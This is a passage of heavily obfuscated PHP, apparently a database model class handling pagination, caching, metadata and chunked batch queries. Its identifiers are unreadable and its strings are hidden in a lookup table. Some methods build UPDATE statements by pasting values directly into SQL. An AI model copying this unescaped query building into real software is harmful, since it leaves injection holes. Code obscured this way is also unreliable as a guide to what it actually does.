(!$this->checkDataAutoHas($_SERVER[çâ¥×ø³][401])) { return; } foreach ($‰ÔôŸå¼ as &$­ºÏ ’¤) { $this->dataAfterFilter($­ºÏ ’¤); } unset($­ºÏ ’¤); } protected function _afterFind(&$Ë¶¤æÊ, $®„ª‰‡Ü) { if (!is_array($Ë¶¤æÊ)) { return; } if (!$this->checkDataAutoHas($_SERVER[çâ¥×ø³][401])) { return; } $this->dataAfterFilter($Ë¶¤æÊ); } public static function textEncode($€ÁÌµËã) { if (!$€ÁÌµËã) { return $€ÁÌµËã; } $µ©¸ôë = json_encode($€ÁÌµËã); $µ©¸ôë = preg_replace_callback($_SERVER[çâ¥×ø³][402], function ($ıï¼¬ú¹) { return addslashes($ıï¼¬ú¹[0]); }, $µ©¸ôë); return json_decode($µ©¸ôë); } public static function textDecode($‡êåë–) { $Ãà­ùñ± =& $_SERVER[çâ¥×ø³]; $æ‚ƒ™Õ = json_encode($‡êåë–); $æ‚ƒ™Õ = preg_replace_callback($Ãà­ùñ±[403], function ($¶Ğ÷µäƒ) { return $_SERVER[çâ¥×ø³][97]; }, $æ‚ƒ™Õ); return json_decode($æ‚ƒ™Õ); } public function setAutoIncrement($™ËÕÙöœ) { $²š¾‰¶² = array($this->getPk() => $™ËÕÙöœ); $™ò‘„˜º = $this->data($²š¾‰¶²)->add(); if ($™ò‘„˜º) { $this->delete($™ò‘„˜º); } } public function getAutoIncrement() { $ÛÛª §Ş = $this->getTableName(); $ìƒÌÙ¿Æ = $this->max($this->getPk()); $‚Ê¯ºÔÏ = $this->query("\163\150\157\167\40\164\141\142\x6c\x65\x20\163\x74\x61\164\165\163\x20\167\x68\145\x72\x65\x20\x4e\141\x6d\145\75\47{$ÛÛª §Ş}\x27"); $Á¬ó—÷ = $‚Ê¯ºÔÏ[0][$_SERVER[çâ¥×ø³][404]]; $Ç›¿”íç = max($ìƒÌÙ¿Æ, $Á¬ó—÷); return $Ç›¿”íç; } protected function _callBefore($Ç½ø†¸“, $ş“×¯²œ) { return $this->cacheCallCheck($Ç½ø†¸“, $ş“×¯²œ, !1); } protected function _callAfter($ï––× , $Û®ˆÑ®) { return $this->cacheCallCheck($ï––× , $Û®ˆÑ®, !0); } protected function cacheFunctionAlias($îï‘¤—²) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($¤û±Èãœ, $‡»Ä‹, $›éÅ­” = false) { $÷µçÒ„ = $this->cacheFunctionAlias($‡»Ä‹); if (!$÷µçÒ„) { return; } foreach ($÷µçÒ„ as $§ßÎëğ± => $íâóéƒ€) { $‡‰—¢ÔØ = $íâóéƒ€[0]; $Ñ·ß¦ç× = explode($_SERVER[çâ¥×ø³][50], $íâóéƒ€[1]); if ($¤û±Èãœ == $§ßÎëğ±) { return $this->cacheFunctionGet($§ßÎëğ±, $‡‰—¢ÔØ); } if ($›éÅ­” && in_array($¤û±Èãœ, $Ñ·ß¦ç×)) { $this->cacheFunctionClear($§ßÎëğ±, $‡‰—¢ÔØ); } } } public function cacheFunctionGet($®Ã¶ÑÃ†, $“ù¶…Î) { $“˜Úì‰‘ = $this->cacheKeyMake($®Ã¶ÑÃ†, $“ù¶…Î); $¦äÜÉ½Ÿ = Cache::get($“˜Úì‰‘); if (!is_array($¦äÜÉ½Ÿ)) { $¦äÜÉ½Ÿ = call_user_func_array(array($this, $®Ã¶ÑÃ†), array($“ù¶…Î, !0)); Cache::set($“˜Úì‰‘, $¦äÜÉ½Ÿ); } return $¦äÜÉ½Ÿ; } public function cacheFunctionClear($·ñ¿Ñ‘, $ºÁóâ§ü) { $îƒ®¿À = $ºÁóâ§ü; if (!is_array($ºÁóâ§ü)) { $îƒ®¿À = array($ºÁóâ§ü); } foreach ($îƒ®¿À as $Í¯Ç×Ïâ) { $§ê¹šÂß = $this->cacheKeyMake($·ñ¿Ñ‘, $Í¯Ç×Ïâ); Cache::remove($§ê¹šÂß); } } private function cacheKeyMake($³ú“ûøˆ, $µÇ…İ¨¬) { $úĞåĞş =& $_SERVER[çâ¥×ø³]; return get_class($this) . $úĞåĞş[11] . $³ú“ûøˆ . $úĞåĞş[405] . $µÇ…İ¨¬; } protected function selectPageReset() { $ã¢·Œ‡Â =& $_SERVER[çâ¥×ø³]; if (isset($GLOBALS[$ã¢·Œ‡Â[406]])) { return; } $GLOBALS[$ã¢·Œ‡Â[406]] = isset($GLOBALS[$ã¢·Œ‡Â[7]][$ã¢·Œ‡Â[407]]) ? $GLOBALS[$ã¢·Œ‡Â[7]][$ã¢·Œ‡Â[407]] : !1; $GLOBALS[$ã¢·Œ‡Â[408]] = isset($GLOBALS[$ã¢·Œ‡Â[7]][$ã¢·Œ‡Â[397]]) ? $GLOBALS[$ã¢·Œ‡Â[7]][$ã¢·Œ‡Â[397]] : !1; $GLOBALS[$ã¢·Œ‡Â[7]][$ã¢·Œ‡Â[407]] = !1; $GLOBALS[$ã¢·Œ‡Â[7]][$ã¢·Œ‡Â[397]] = !1; } protected function selectPageRestore() { $ìÊâ¾ =& $_SERVER[çâ¥×ø³]; if (!isset($GLOBALS[$ìÊâ¾[406]])) { return; } $GLOBALS[$ìÊâ¾[7]][$ìÊâ¾[407]] = $GLOBALS[$ìÊâ¾[406]]; $GLOBALS[$ìÊâ¾[7]][$ìÊâ¾[397]] = $GLOBALS[$ìÊâ¾[408]]; if ($GLOBALS[$ìÊâ¾[7]][$ìÊâ¾[407]] === !1) { unset($GLOBALS[$ìÊâ¾[7]][$ìÊâ¾[407]]); } if ($GLOBALS[$ìÊâ¾[7]][$ìÊâ¾[397]] === !1) { unset($GLOBALS[$ìÊâ¾[7]][$ìÊâ¾[397]]); } unset($GLOBALS[$ìÊâ¾[406]]); unset($GLOBALS[$ìÊâ¾[408]]); } protected function selectPage($á÷Æ´‰ = 200, $ƒ×ÄÍ = 1) { $Èü¹ºÛÎ =& $_SERVER[çâ¥×ø³]; global $in; $œØ‘¡ˆÄ = $this->optionsValue(); $×Ô…º = 50000; $á÷Æ´‰ = isset($in[$Èü¹ºÛÎ[407]]) && $in[$Èü¹ºÛÎ[407]] ? $in[$Èü¹ºÛÎ[407]] : $á÷Æ´‰; if ($á÷Æ´‰ === -1) { $in[$Èü¹ºÛÎ[407]] = !1; $×Ô…º = 100000000; $á÷Æ´‰ = $×Ô…º; } $œ“‹®Ø¦ = $œØ‘¡ˆÄ; $œ“‹®Ø¦[$Èü¹ºÛÎ[409]] = array(); $á÷Æ´‰ = intval($á÷Æ´‰); $á÷Æ´‰ = $á÷Æ´‰ <= 5 ? 5 : ($á÷Æ´‰ >= $×Ô…º ? $×Ô…º : $á÷Æ´‰); $ƒ×ÄÍ = intval(isset($in[$Èü¹ºÛÎ[397]]) && $in[$Èü¹ºÛÎ[397]] ? $in[$Èü¹ºÛÎ[397]] : $ƒ×ÄÍ); $ƒ×ÄÍ = $ƒ×ÄÍ <= 1 ? 1 : $ƒ×ÄÍ; $³¢ìƒí‚ = array(); $Ÿöƒ ¥Ç = 1; if ($ƒ×ÄÍ == 1 && $Ÿöƒ ¥Ç) { $this->optionsValue($œØ‘¡ˆÄ); $³¢ìƒí‚ = $this->page($ƒ×ÄÍ, $á÷Æ´‰)->select(); $¢Ø¡Ç¢ = is_array($³¢ìƒí‚) ? count($³¢ìƒí‚) : 0; if ($¢Ø¡Ç¢ < $á÷Æ´‰) { $º§ˆÀŸÊ = 1; } else { $this->optionsValue($œ“‹®Ø¦); $¢Ø¡Ç¢ = intval($this->count()); $º§ˆÀŸÊ = ceil($¢Ø¡Ç¢ / $á÷Æ´‰); } } else { $this->optionsValue($œ“‹®Ø¦); $¢Ø¡Ç¢ = intval($this->count()); $º§ˆÀŸÊ = ceil($¢Ø¡Ç¢ / $á÷Æ´‰); $ƒ×ÄÍ = $ƒ×ÄÍ >= $º§ˆÀŸÊ ? $º§ˆÀŸÊ : $ƒ×ÄÍ; $this->optionsValue($œØ‘¡ˆÄ); $³¢ìƒí‚ = $this->page($ƒ×ÄÍ, $á÷Æ´‰)->select(); } if (!is_array($³¢ìƒí‚)) { $³¢ìƒí‚ = array(); } if ($º§ˆÀŸÊ == 1) { $¢Ø¡Ç¢ = count($³¢ìƒí‚); } $öÂ—İòÜ = array($Èü¹ºÛÎ[410] => array($Èü¹ºÛÎ[411] => $¢Ø¡Ç¢, $Èü¹ºÛÎ[407] => $á÷Æ´‰, $Èü¹ºÛÎ[397] => $ƒ×ÄÍ, $Èü¹ºÛÎ[412] => $º§ˆÀŸÊ), $Èü¹ºÛÎ[413] => $³¢ìƒí‚); return $öÂ—İòÜ; } protected function checkLength($âê–±î±, $Çû©é„ª = 0, $’âØ¦Ş¡ = '') { $ì±­Ù½› =& $_SERVER[çâ¥×ø³]; $Çû©é„ª = $Çû©é„ª ? $Çû©é„ª : 65536; if (!$âê–±î± || strlen($âê–±î±) < $Çû©é„ª) { return; } $’âØ¦Ş¡ = $’âØ¦Ş¡ ? $’âØ¦Ş¡ . $ì±­Ù½›[71] : $ì±­Ù½›[12]; show_json($’âØ¦Ş¡ . LNG($ì±­Ù½›[414]) . "\50{$Çû©é„ª}\x29", !1); } protected function metaSet($Ü¶ÃéÊ‚, $´äü™Ø¦ = null, $âËĞš¤ø = null) { $™¾ˆ¬ş  =& $_SERVER[çâ¥×ø³]; if (!$this->tableMeta || !$Ü¶ÃéÊ‚) { return !1; } $Ô¦™ÉÇ = $this->tableMeta[$™¾ˆ¬ş [415]]; $ãÌ¯Œ = $this->tableMeta[$™¾ˆ¬ş [416]]; $úõ´¸ø’ = Model($ãÌ¯Œ); $ªëü–ºû = array($Ô¦™ÉÇ => $Ü¶ÃéÊ‚, $™¾ˆ¬ş [417] => $´äü™Ø¦); if (is_null($´äü™Ø¦)) { return $úõ´¸ø’->where(array($Ô¦™ÉÇ => $Ü¶ÃéÊ‚))->delete(); } if (is_null($âËĞš¤ø) && is_string($´äü™Ø¦)) { return $úõ´¸ø’->where($ªëü–ºû)->delete(); } $ñÖë°ğ’ = is_array($´äü™Ø¦) ? $´äü™Ø¦ : array(); if (is_string($´äü™Ø¦)) { $ñÖë°ğ’[$´äü™Ø¦] = $âËĞš¤ø; } $Œ–ÅùÔ™ = array(); foreach ($ñÖë°ğ’ as $—Ü‰ö => $™ûåˆ“ú) { if (is_null($™ûåˆ“ú) && is_string($—Ü‰ö)) { $úõ´¸ø’->where(array($Ô¦™ÉÇ => $Ü¶ÃéÊ‚, $™¾ˆ¬ş [417] => $—Ü‰ö))->delete(); continue; } $this->checkLength($™ûåˆ“ú, !1, $ãÌ¯Œ . $™¾ˆ¬ş [4] . $—Ü‰ö); $Œ–ÅùÔ™[] = array($Ô¦™ÉÇ => $Ü¶ÃéÊ‚, $™¾ˆ¬ş [94] => $—Ü‰ö, $™¾ˆ¬ş [418] => $™ûåˆ“ú); } $êïÄÙš = $™¾ˆ¬ş [419] . $ãÌ¯Œ; CacheLock::lock($êïÄÙš); $úõ´¸ø’->where(array($Ô¦™ÉÇ => $Ü¶ÃéÊ‚))->addAll($Œ–ÅùÔ™, array(), !0); CacheLock::unlock($êïÄÙš); return !0; } public function metaGet($Ä¨òı¸Ü, $ûå‚»Û­ = false) { $çêÀ°…ã =& $_SERVER[çâ¥×ø³]; if (!$this->tableMeta) { return array(); } $‘Û±©ô± = $this->tableMeta[$çêÀ°…ã[415]]; $§—ìšŞ‡ = Model($this->tableMeta[$çêÀ°…ã[416]]); if ($ûå‚»Û­) { $úŞé÷ÈÌ = array($‘Û±©ô± => $Ä¨òı¸Ü, $çêÀ°…ã[94] => $ûå‚»Û­); return $§—ìšŞ‡->where($úŞé÷ÈÌ)->getField($çêÀ°…ã[418]); } $úŞé÷ÈÌ = array($‘Û±©ô± => $Ä¨òı¸Ü); $™­¶µŸØ = $§—ìšŞ‡->field($çêÀ°…ã[420])->where($úŞé÷ÈÌ)->select(); $™­¶µŸØ = array_to_keyvalue($™­¶µŸØ, $çêÀ°…ã[94], $çêÀ°…ã[418]); return $™­¶µŸØ; } private function checkDataAutoHas($ƒ©Öß“) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ØÛÀùİ) { if (in_array($ƒ©Öß“, explode($_SERVER[çâ¥×ø³][50], $ØÛÀùİ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ß¾şË¡Ê, $âàØŞÓÌ) { $ ë¦Ëú‡ =& $_SERVER[çâ¥×ø³]; if (!is_array($ß¾şË¡Ê)) { return; } foreach ($this->dataAuto as $ÖÊÊÍÈ) { $›Ï–«çë = $ÖÊÊÍÈ[0]; if (!in_array($âàØŞÓÌ, explode($ ë¦Ëú‡[50], $ÖÊÊÍÈ[2]))) { continue; } switch (trim($ÖÊÊÍÈ[3])) { case $ ë¦Ëú‡[365]: case $ ë¦Ëú‡[366]: $ıÉ œ‹ = $ÖÊÊÍÈ[1]; $úßù¾ğ… = isset($ÖÊÊÍÈ[4]) ? (array) $ÖÊÊÍÈ[4] : array(); if ($ıÉ œ‹ == $ ë¦Ëú‡[194] && array_key_exists($›Ï–«çë, $ß¾şË¡Ê)) { if (!$ß¾şË¡Ê[$›Ï–«çë]) { unset($ß¾şË¡Ê[$›Ï–«çë]); } break; } if (isset($ß¾şË¡Ê[$›Ï–«çë])) { array_unshift($úßù¾ğ…, $ß¾şË¡Ê[$›Ï–«çë]); } if ($ ë¦Ëú‡[365] == $ÖÊÊÍÈ[3]) { $ß¾şË¡Ê[$›Ï–«çë] = call_user_func_array($ıÉ œ‹, $úßù¾ğ…); } else { $ß¾şË¡Ê[$›Ï–«çë] = call_user_func_array(array(&$this, $ıÉ œ‹), $úßù¾ğ…); } break; case $ ë¦Ëú‡[314]: if (isset($ß¾şË¡Ê[$›Ï–«çë]) && $ß¾şË¡Ê[$›Ï–«çë]) { $ß¾şË¡Ê[$›Ï–«çë] = call_user_func_array(array(&$this, $ÖÊÊÍÈ[1]), array($ß¾şË¡Ê[$›Ï–«çë])); } break; case $ ë¦Ëú‡[317]: $ß¾şË¡Ê[$›Ï–«çë] = $ß¾şË¡Ê[$ÖÊÊÍÈ[1]]; break; case $ ë¦Ëú‡[338]: if (isset($ß¾şË¡Ê[$›Ï–«çë]) && !is_string($ß¾şË¡Ê[$›Ï–«çë])) { $ß¾şË¡Ê[$›Ï–«çë] = json_encode_force($ß¾şË¡Ê[$›Ï–«çë]); } break; case $ ë¦Ëú‡[367]: if ($ß¾şË¡Ê[$›Ï–«çë] === $ ë¦Ëú‡[12]) { unset($ß¾şË¡Ê[$›Ï–«çë]); } break; case $ ë¦Ëú‡[368]: $ß¾şË¡Ê[$›Ï–«çë] = $ÖÊÊÍÈ[1]; default: break; } } if ($âàØŞÓÌ == $ ë¦Ëú‡[399]) { $ĞÇÄ‚ñš = strtolower($this->db->getDbType()); if (strpos($ĞÇÄ‚ñš, $ ë¦Ëú‡[13]) !== 0) { return; } $ÂÀØÉï = $this->field(!0)->fields; $óê­•äï = $ÂÀØÉï[$ ë¦Ëú‡[296]]; if (isset($ÂÀØÉï[$ ë¦Ëú‡[295]])) { unset($óê­•äï[$ÂÀØÉï[$ ë¦Ëú‡[295]]]); } foreach ($óê­•äï as $ÒÀä´À˜ => $âàØŞÓÌ) { if (!isset($ß¾şË¡Ê[$ÒÀä´À˜])) { $ß¾şË¡Ê[$ÒÀä´À˜] = $ ë¦Ëú‡[12]; } } } } private function dataAfterFilter(&$ĞÍó¿Á) { $ßûòÇªø =& $_SERVER[çâ¥×ø³]; foreach ($this->dataAuto as $ã”¹öŒê) { $…İ€Ò = $ã”¹öŒê[0]; if (!isset($ĞÍó¿Á[$…İ€Ò])) { continue; } if (!in_array($ßûòÇªø[401], explode($ßûòÇªø[50], $ã”¹öŒê[2]))) { continue; } switch (trim($ã”¹öŒê[3])) { case $ßûòÇªø[365]: case $ßûòÇªø[366]: $µŸ©€¬ø = isset($ã”¹öŒê[4]) ? (array) $ã”¹öŒê[4] : array(); array_unshift($µŸ©€¬ø, $ĞÍó¿Á[$…İ€Ò]); if (isset($ã”¹öŒê[4]) && $ã”¹öŒê[4] == $ßûòÇªø[421]) { $µŸ©€¬ø = array($ĞÍó¿Á[$…İ€Ò]); } if ($ßûòÇªø[365] == $ã”¹öŒê[3]) { $ĞÍó¿Á[$…İ€Ò] = call_user_func_array($ã”¹öŒê[1], $µŸ©€¬ø); } else { $ĞÍó¿Á[$…İ€Ò] = call_user_func_array(array(&$this, $ã”¹öŒê[1]), $µŸ©€¬ø); } break; case $ßûòÇªø[314]: if (isset($ĞÍó¿Á[$…İ€Ò]) && $ĞÍó¿Á[$…İ€Ò]) { $ĞÍó¿Á[$…İ€Ò] = call_user_func_array(array(&$this, $ã”¹öŒê[1]), array($ĞÍó¿Á[$…İ€Ò])); } break; case $ßûòÇªø[317]: $ĞÍó¿Á[$…İ€Ò] = $ĞÍó¿Á[$ã”¹öŒê[1]]; break; case $ßûòÇªø[338]: $ÎêÛİ…­ = $ĞÍó¿Á[$…İ€Ò]; $ĞÍó¿Á[$…İ€Ò] = json_decode($ÎêÛİ…­, !0); if (is_null($ĞÍó¿Á[$…İ€Ò])) { $ĞÍó¿Á[$…İ€Ò] = $ÎêÛİ…­; } break; case $ßûòÇªø[367]: if ($ĞÍó¿Á[$…İ€Ò] === $ßûòÇªø[12]) { unset($ĞÍó¿Á[$…İ€Ò]); } break; case $ßûòÇªø[368]: $ĞÍó¿Á[$…İ€Ò] = $ã”¹öŒê[1]; break; default: break; } } } public function saveAll($åıôûà–) { $€Øô»–‹ =& $_SERVER[çâ¥×ø³]; $†ŒÇ¥†Ñ = $this->tablePrefix . $this->tableName; $·™÷µë· = self::SQL_WHERE_IN_CHUNK; $åıôûà– = is_array($åıôûà–) ? $åıôûà– : array(); $íéÄ¥İô = $€Øô»–‹[422]; $İÈãıü = 0; $“—Ş€ä = array(); $¦Ë„‡ï = count($åıôûà–); for ($«¨Ô¬† = 0; $«¨Ô¬† < $¦Ë„‡ï; $«¨Ô¬†++) { $šçóµĞú = $åıôûà–[$«¨Ô¬†]; if (!is_array($šçóµĞú) || count($šçóµĞú) != 4) { continue; } $Æ‹Ê×ˆ = "\x55\x50\x44\101\x54\105\x20\x60{$†ŒÇ¥†Ñ}\x60\x20\123\105\x54\x20{$šçóµĞú[2]}\x20\75\40\x43\101\123\x45\40{$šçóµĞú[0]}\x20\xa"; if ($İÈãıü == 0) { $íéÄ¥İô = $Æ‹Ê×ˆ; } $“—Ş€ä[] = $€Øô»–‹[118] . $šçóµĞú[1] . $€Øô»–‹[118]; $İÈãıü++; $íéÄ¥İô .= "\x20\127\110\105\116\x20\x27{$šçóµĞú[1]}\47\40\124\x48\x45\116\x20\47{$šçóµĞú[3]}\x27\x20\xa"; if ($İÈãıü == $·™÷µë· || $«¨Ô¬† == $¦Ë„‡ï - 1) { $ÍğÃ¡©• = implode($€Øô»–‹[50], $“—Ş€ä); $íéÄ¥İô .= "\40\105\x4e\104\x20\x20\x57\x48\x45\122\105\40{$šçóµĞú[0]}\x20\111\116\x20\x28{$ÍğÃ¡©•}\51\x20"; $this->execute($íéÄ¥İô); $İÈãıü = 0; $íéÄ¥İô = $Æ‹Ê×ˆ; $this->chunkEventCheck(count($“—Ş€ä)); $“—Ş€ä = array(); } } $this->chunkEventSet(); } public function saveAllEach($Ä­¸¨áè) { $åˆœÙãÌ =& $_SERVER[çâ¥×ø³]; $ÂÑÆ»Ğ = $this->tablePrefix . $this->tableName; foreach ($Ä­¸¨áè as $ ¦ŠòÒ) { if (!is_array($ ¦ŠòÒ) || count($ ¦ŠòÒ) != 4) { continue; } $’ï‘—’ê = $ ¦ŠòÒ[0] . $åˆœÙãÌ[423] . $ ¦ŠòÒ[1] . $åˆœÙãÌ[118]; $ÊÌğÔŠù = $ ¦ŠòÒ[2] . $åˆœÙãÌ[423] . $ ¦ŠòÒ[3] . $åˆœÙãÌ[118]; $Ú¤¼’¥… = "\165\x70\144\x61\164\x65\x20{$ÂÑÆ»Ğ}\x20\163\x65\164\x20{$ÊÌğÔŠù}\x20\x77\150\145\162\x65\x20{$’ï‘—’ê}\x3b"; $this->execute($Ú¤¼’¥…); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($‰Ğ×‡Ô = false, $·×Ô·Õ = false) { $this->_chunkEvent = $‰Ğ×‡Ô; $this->_chunkEventParam = $·×Ô·Õ; } private function chunkEventCheck($ê»ñ§òö) { if (!$this->_chunkEvent) { return; } $ëÑÀ½ç = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ëÑÀ½ç[$_SERVER[çâ¥×ø³][424]] = $ê»ñ§òö; Hook::trigger($this->_chunkEvent, $ëÑÀ½ç); } public function addAll($Ñ•¤¿–Ë, $ıé²Şü = array(), $Ì×Ì = false) { $©ƒÇ´§À =& $_SERVER[çâ¥×ø³]; ignore_timeout(); $ñ¯ñêĞÂ = self::SQL_WHERE_IN_CHUNK; if (empty($Ñ•¤¿–Ë)) { $this->error = think_lang($©ƒÇ´§À[315]); return !1; } $ıé²Şü = $this->_parseOptions($ıé²Şü); foreach ($Ñ•¤¿–Ë as $Ê‚‡÷³Ø => $Ş¾¼ÒŠ) { $Ñ•¤¿–Ë[$Ê‚‡÷³Ø] = $this->_facade($Ş¾¼ÒŠ); $this->_beforeInsert($Ñ•¤¿–Ë[$Ê‚‡÷³Ø], $ıé²Şü); } if (method_exists($this->db, $©ƒÇ´§À[316])) { for ($¤¾Øñİá = 0; $¤¾Øñİá < count($Ñ•¤¿–Ë); $¤¾Øñİá += $ñ¯ñêĞÂ) { $³àçüú¶ = array_slice($Ñ•¤¿–Ë, $¤¾Øñİá, $ñ¯ñêĞÂ); if (!is_array($³àçüú¶) || count($³àçüú¶) == 0) { break; } $âé‰ÛÛµ = $this->db->insertAll($³àçüú¶, $ıé²Şü, $Ì×Ì); $this->chunkEventCheck(count($³àçüú¶)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Ñ•¤¿–Ë as $Ê‚‡÷³Ø => $Ş¾¼ÒŠ) { $âé‰ÛÛµ = $this->db->insert($Ş¾¼ÒŠ, $ıé²Şü, $Ì×Ì); } $this->commit(); } if (!1 !== $âé‰ÛÛµ) { $ …ª† = $this->getLastInsID(); if ($ …ª†) { return $ …ª†; } } return $âé‰ÛÛµ; } public function save($†«º ¿± = '', $½ÙØ˜ = array()) { $äİÉÚøª =& $_SERVER[çâ¥×ø³]; $†ÍÔò¿ = self::SQL_WHERE_IN_CHUNK; $ş˜Ş· = $this->optionsValue(); $¤ÓÏº£† = $this->findWhereField($ş˜Ş·); if (!$¤ÓÏº£†) { return parent::save($†«º ¿±, $½ÙØ˜); } $öØ¹÷Ö = 0; $Ä´Áö¶Ú = $ş˜Ş·[$äİÉÚøª[319]][$¤ÓÏº£†][1]; $Ä´Áö¶Ú = is_array($Ä´Áö¶Ú) ? $Ä´Áö¶Ú : array(); $ë¸·“Ï™ = count($Ä´Áö¶Ú); for ($ÆæĞ’ªø = 0; $ÆæĞ’ªø < $ë¸·“Ï™; $ÆæĞ’ªø += $†ÍÔò¿) { $²£Ê£è = array_slice($Ä´Áö¶Ú, $ÆæĞ’ªø, $†ÍÔò¿); if (!is_array($²£Ê£è) || count($²£Ê£è) == 0) { break; } $ş˜Ş·[$äİÉÚøª[319]][$¤ÓÏº£†][1] = $²£Ê£è; $this->optionsValue($ş˜Ş·); $öØ¹÷Ö += parent::save($†«º ¿±, $½ÙØ˜); $this->chunkEventCheck(count($²£Ê£è)); } $this->chunkEventSet(); return $öØ¹÷Ö; } public function add($åÆ’§Òß = '', $‰âöŠ’Ö = array(), $º£ß—Î = false) { if ($this->addTaskStatus && is_array($åÆ’§Òß)) { $this->addTaskData[] = $åÆ’§Òß; return; } return parent::add($åÆ’§Òß, $‰âöŠ’Ö, $º£ß—Î); } public function parseWhereLike($ößÙû°, $ ö·âœ = '', $Š²æŸ³ = false, &$„ŒçŸ­¸ = false) { $–şêÒÈ³ =& $_SERVER[çâ¥×ø³]; $é©ÁØÇ¦ = $GLOBALS[$–şêÒÈ³[6]][$–şêÒÈ³[425]]; if (!$é©ÁØÇ¦[$–şêÒÈ³[426]]) { return $ößÙû°; } if (!is_array($ößÙû°)) { return $ößÙû°; } $öûƒ‹‹ = array(); $£÷ìûŠÃ = 0; foreach ($ößÙû° as $‹«†ÏßÅ => $˜ıø¾ÃÆ) { if (is_array($˜ıø¾ÃÆ) && count($˜ıø¾ÃÆ) == 2 && $˜ıø¾ÃÆ[0] == $–şêÒÈ³[427] && is_string($˜ıø¾ÃÆ[1]) && substr($˜ıø¾ÃÆ[1], 0, 1) == $–şêÒÈ³[428] && substr($˜ıø¾ÃÆ[1], strlen($˜ıø¾ÃÆ[1]) - 1, 1) == $–şêÒÈ³[428]) { $„ŒçŸ­¸ = !0; $È€Ä’ó— = is_string($‹«†ÏßÅ) ? $‹«†ÏßÅ : $ ö·âœ; $¿³êÃÉ = substr($˜ıø¾ÃÆ[1], 1, strlen($˜ıø¾ÃÆ[1]) - 2); $¿³êÃÉ = $this->db->escapeString($¿³êÃÉ); if (!strpos($È€Ä’ó—, $–şêÒÈ³[10])) { $È€Ä’ó— = $–şêÒÈ³[429] . $È€Ä’ó— . $–şêÒÈ³[429]; } $Ÿıêñ¶ñ = $–şêÒÈ³[203] . $¿³êÃÉ . $–şêÒÈ³[203]; $¿³êÃÉ = str_replace(array($–şêÒÈ³[10], $–şêÒÈ³[430], $–şêÒÈ³[11]), $–şêÒÈ³[431], $¿³êÃÉ); if ($é©ÁØÇ¦[$–şêÒÈ³[432]]) { $Ÿıêñ¶ñ = $–şêÒÈ³[433] . $¿³êÃÉ . $–şêÒÈ³[434]; if ($é©ÁØÇ¦[$–şêÒÈ³[435]]) { $Ÿıêñ¶ñ = $–şêÒÈ³[434] . $¿³êÃÉ . $–şêÒÈ³[433]; } } $öûƒ‹‹[$£÷ìûŠÃ] = $–şêÒÈ³[436] . $È€Ä’ó— . $–şêÒÈ³[437] . $Ÿıêñ¶ñ . $–şêÒÈ³[438]; $£÷ìûŠÃ++; continue; } if (is_array($˜ıø¾ÃÆ)) { $ ö·âœ = is_string($‹«†ÏßÅ) ? $‹«†ÏßÅ : $ ö·âœ; $˜ıø¾ÃÆ = $this->parseWhereLike($˜ıø¾ÃÆ, $ ö·âœ, !0, $„ŒçŸ­¸); } if (is_numeric($‹«†ÏßÅ)) { $öûƒ‹‹[$£÷ìûŠÃ] = $˜ıø¾ÃÆ; $£÷ìûŠÃ++; } else { $öûƒ‹‹[$‹«†ÏßÅ] = $˜ıø¾ÃÆ; } } if ($„ŒçŸ­¸ && !$Š²æŸ³) { } return $öûƒ‹‹; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($€ˆğ°Úæ = array()) { $ µĞ»¥Ò =& $_SERVER[çâ¥×ø³]; $‰É§¥¹ª = self::SQL_WHERE_IN_CHUNK; $÷÷¯‚°˜ = $this->optionsValue(); $£¸¥í’á = $this->findWhereField($÷÷¯‚°˜); if (!$£¸¥í’á || isset($÷÷¯‚°˜[$ µĞ»¥Ò[336]]) || isset($÷÷¯‚°˜[$ µĞ»¥Ò[397]])) { return parent::select($€ˆğ°Úæ); } $šï·ûª² = $÷÷¯‚°˜[$ µĞ»¥Ò[319]][$£¸¥í’á][1]; $šï·ûª² = is_array($šï·ûª²) ? $šï·ûª² : array(); $š¥ÈşÕ¬ = null; for ($ØŸç‰Æ¬ = 0; $ØŸç‰Æ¬ < count($šï·ûª²); $ØŸç‰Æ¬ += $‰É§¥¹ª) { $‘†­ê½Ò = array_slice($šï·ûª², $ØŸç‰Æ¬, $‰É§¥¹ª); if (!is_array($‘†­ê½Ò) || count($‘†­ê½Ò) == 0) { break; } $÷÷¯‚°˜[$ µĞ»¥Ò[319]][$£¸¥í’á][1] = $‘†­ê½Ò; $this->optionsValue($÷÷¯‚°˜); $½ÛİÒåä = parent::select($€ˆğ°Úæ); if (!$½ÛİÒåä) { continue; } $š¥ÈşÕ¬ = is_array($š¥ÈşÕ¬) ? $š¥ÈşÕ¬ : array(); $š¥ÈşÕ¬ = array_merge($š¥ÈşÕ¬, $½ÛİÒåä); } return $š¥ÈşÕ¬; } public function delete($Ö‡™ıƒ = array()) { $¼ÖâËó™ =& $_SERVER[çâ¥×ø³]; $Ş•Ôúôı = self::SQL_WHERE_IN_CHUNK; $¬ñ“öÃ = $this->optionsValue(); $½®÷úĞŠ = $this->findWhereField($¬ñ“öÃ); if (!$½®÷úĞŠ) { return parent::delete($Ö‡™ıƒ); } $ú‚ˆÙõÆ = 0; $û¸”áâ» = $¬ñ“öÃ[$¼ÖâËó™[319]][$½®÷úĞŠ][1]; $û¸”áâ» = is_array($û¸”áâ») ? $û¸”áâ» : array(); for ($Ÿ¨‚Å£ = 0; $Ÿ¨‚Å£ < count($û¸”áâ»); $Ÿ¨‚Å£ += $Ş•Ôúôı) { $şÄ¡À¯ = array_slice($û¸”áâ», $Ÿ¨‚Å£, $Ş•Ôúôı); if (!is_array($şÄ¡À¯) || count($şÄ¡À¯) == 0) { break; } $¬ñ“öÃ[$¼ÖâËó™[319]][$½®÷úĞŠ][1] = $şÄ¡À¯; $this->optionsValue($¬ñ“öÃ); $ú‚ˆÙõÆ += parent::delete($Ö‡™ıƒ); } return $ú‚ˆÙõÆ; } private function findWhereField($ÇÃ¸¨´Î) { $á“îá…š =& $_SERVER[çâ¥×ø³]; $°¢Òæ¡ = self::SQL_WHERE_IN_CHUNK; if (!is_array($ÇÃ¸¨´Î) || 